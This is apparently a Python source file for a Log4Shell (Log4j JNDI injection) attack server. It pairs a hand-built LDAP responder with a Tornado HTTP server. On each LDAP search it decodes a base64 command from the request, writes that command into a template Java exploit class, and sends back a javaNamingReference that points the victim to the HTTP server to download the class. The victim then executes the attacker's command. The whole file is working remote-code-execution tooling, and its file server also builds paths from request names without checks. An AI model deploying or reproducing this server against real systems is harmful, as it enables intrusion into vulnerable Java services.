import os
import asyncio
import struct
import tornado.web
from enum import IntEnum
from base64 import b64decode


LDAP_PORT = int(os.environ.get("L4J_LDAP_PORT", 1389))
HTTP_PORT = int(os.environ.get("L4J_HTTP_PORT", 8888))
LOCAL_IP = os.environ.get("L4J_LOCAL_IP", "10.48.58.123")

class MappedEnum(IntEnum):
    @classmethod
    def has(cls, value):
        return value in cls._value2member_map_


class LdapHeader(MappedEnum):
    SEQUENCE = 48 # 0x30


class LdapCommand(MappedEnum):
    BIND_REQUEST = 0
    UNBIND_REQUEST = 2
    SEARCH_REQUEST = 3
    SEARCH_ABANDON = 16


class LdapSyntax(MappedEnum):
    STRING = 7


class LdapPacket:
    """
    LDAP Packet unpacker, takes data as RAW ldap bytes, stores values as local attributes
    """

    def __init__(self, data):

        self.ldap_index = 0 # Index for entire unpacking
        self.data = data # Raw bytes

        # Unpack standard headers
        _, _, _, body = self.unpack_field(move_to_end=False)
        _, _, _, self.msg_id = self.unpack_field()
        _, _, self.proto_op, _ = self.unpack_field(move_to_end=False)

        # Unpack search specific fields
        if self.proto_op == LdapCommand.SEARCH_REQUEST:
            _, _, _, base_obj = self.unpack_field()
            self.base_obj = base_obj.decode()
            _, _, _, scope = self.unpack_field()
            _, _, _, deref_aliases = self.unpack_field()
            _, _, _, size_limit = self.unpack_field()
            _, _, _, time_limit = self.unpack_field()
            _, _, _, types_only = self.unpack_field()
            _, _, filter_type, fltr = self.unpack_field()
            if not filter_type == LdapSyntax.STRING:
                raise ValueError(f"Search filter type {filter_type} not implemented")
            self.filter = fltr.decode()
            # Ignoring controls fields, we don't need them
        
    def unpack_field(self, move_to_end=True):
        """
        Unpack per ASN.1 BER spec, move_to_end should be false when we want the index to
        reference contents of the value in TLV, such as LDAP header
        """

        # Tag byte
        data_type = self.data[self.ldap_index] & 192
        value_type = self.data[self.ldap_index] & 32
        data_syntax = self.data[self.ldap_index] & 31
        self.ldap_index += 1

        # Value length
        is_long = self.data[self.ldap_index] & 128
        if is_long:
            len_len = self.data[self.ldap_index] & 127
            value_len = int.from_bytes(self.data[self.ldap_index + 1: self.ldap_index + 1 + len_len])
            self.ldap_index += len_len
        else:
            value_len = self.data[self.ldap_index] & 127
            self.ldap_index += 1
        
        # Slice value
        value_bytes = self.data[self.ldap_index : self.ldap_index + value_len]
        if move_to_end:
            self.ldap_index += value_len

        return data_type, value_type, data_syntax, value_bytes


def get_len_bytes(total_len):
    """
    Generate ASN.1 BER length bytes
    """
    if total_len > 127:
        return b"\x84" + total_len.to_bytes(4, "big")
    return total_len.to_bytes(1, "big")


def encode_partial_attribute_list(type_str, val_str):

    p2 = val_str.encode() if isinstance(val_str, str) else val_str
    p2_data = b"\x04" + struct.pack("B", len(p2)) + p2
    p2_data = b"\x31" + struct.pack("B", len(p2_data)) + p2_data

    p1 = type_str.encode() if isinstance(type_str, str) else type_str
    p1_data = b"\x04" + struct.pack("B", len(p1)) + p1
    p1_data = b"\x30" + struct.pack("B", len(p1_data) + len(p2_data)) + p1_data

    return p1_data + p2_data


class LDAPServer(asyncio.Protocol):
    def connection_made(self, transport):
        peername = transport.get_extra_info('peername')
        print('Connection from {}'.format(peername))
        self.transport = transport

    def send_bind_response(self, data, lp):
        r_data = data[0:4] + lp.msg_id
        # Bind success, no errors
        r_data += b"\x61\x07\x0a\x01\x00\x04\x00\x04\x00"
        self.transport.write(r_data)
        print(" Sent bind response")
    
    def search(self, data, lp):
        print(f" Base object: {lp.base_obj}")
        print(f" Filter: {lp.filter}")

        # Copy template to target class, replacing embedded command
        target_class = "data/exploit.class"
        template_class = "data/exploittemplate.class"
        template_tag = "--template--" # This is the string to replace in the .class file
        # Command comes from b64 embedded parameter at end of URL
        cmd = b64decode(lp.base_obj.split("/")[-1].encode()).decode()
        if os.path.exists(target_class):
            os.unlink(target_class)
        with open(template_class, "rb") as f:
            class_data = f.read()
        template_index = class_data.index(template_tag.encode())
        if not template_index:
            raise ValueError("Did not find value string for templating")
        template_index -=2 # Need to make sure we erase the old string length
        with open(target_class, "wb") as f:
            f.write(class_data[:template_index]) # File before template string
            f.write(struct.pack(">H", len(cmd))) # Length of new template string
            f.write(cmd.encode()) # New command
            f.write(class_data[template_index + 2 + len(template_tag):]) # File after command template

        # Send SearchResEntry Message, need to generate from inside out to calculate length headers
        search_res_entry = b"\x04" + get_len_bytes(len(lp.base_obj)) + lp.base_obj.encode()

        attrs = encode_partial_attribute_list("javaClassName", "exploit")
        attrs += encode_partial_attribute_list("javaCodeBase", f"http://{LOCAL_IP}:{HTTP_PORT}/")
        attrs += encode_partial_attribute_list("objectClass", "javaNamingReference")
        attrs += encode_partial_attribute_list("javaFactory", "exploit")
        attr_list = b"\x30" + get_len_bytes(len(attrs)) + attrs

        body = b"\x64" + get_len_bytes(len(search_res_entry) + len(attr_list)) + search_res_entry + attr_list

        r_data = b"\x30" + get_len_bytes(len(body) + 2 + len(lp.msg_id)) + b"\x02\x01" + lp.msg_id + body
        self.transport.write(r_data)
        print(" Sent search response")
        
        r_data = b"\x30\x0c\x02\x01" + lp.msg_id + b"\x65\x07\x0a\x01\x00\x04\x00\x04\x00"
        self.transport.write(r_data)
        print(" Sent search response done ")

    def data_received(self, data):
        try:
            lp = LdapPacket(data)
        except ValueError as e:
            print(f"Exception {e}")
            print(f"Could not decode packet - {data.hex()}")
        
        if lp.proto_op == LdapCommand.BIND_REQUEST:
            print("Received bind request")
            self.send_bind_response(data, lp)

        elif lp.proto_op == LdapCommand.UNBIND_REQUEST:
            print("Received unbind request")
            self.transport.close()
            print(" Closed connection")
        
        elif lp.proto_op == LdapCommand.SEARCH_REQUEST:
            print("Received search request")
            self.search(data, lp)

        elif lp.proto_op == LdapCommand.SEARCH_ABANDON:
            print("Client abandonded search")
            self.transport.close()
            print("Closed connection")

        else:
            print(f"Received unhandled message type {lp.proto_op}")
            self.transport.close()
            print("Closed connection")


class DownloadFile(tornado.web.RequestHandler):

    def get(self, file_name):
        print(f"HTTP: Request for {file_name}")
        target_file = "data/" + file_name
        self.set_header('Content-Type', 'application/octet-stream')
        self.set_header('Content-Disposition', 'attachment; filename=' + file_name)
        with open(target_file, "rb") as f:
            self.write(f.read())
        self.finish()


async def main():
    loop = asyncio.get_running_loop()

    # Setup HTTP server
    app = tornado.web.Application([ (r"/(.*)", DownloadFile, {})])
    app.listen(HTTP_PORT)

    # Setup LDAP server
    server = await loop.create_server(
        lambda: LDAPServer(),
        '0.0.0.0', LDAP_PORT)
    async with server:
        await server.serve_forever()


if __name__ == "__main__":
    asyncio.run(main())
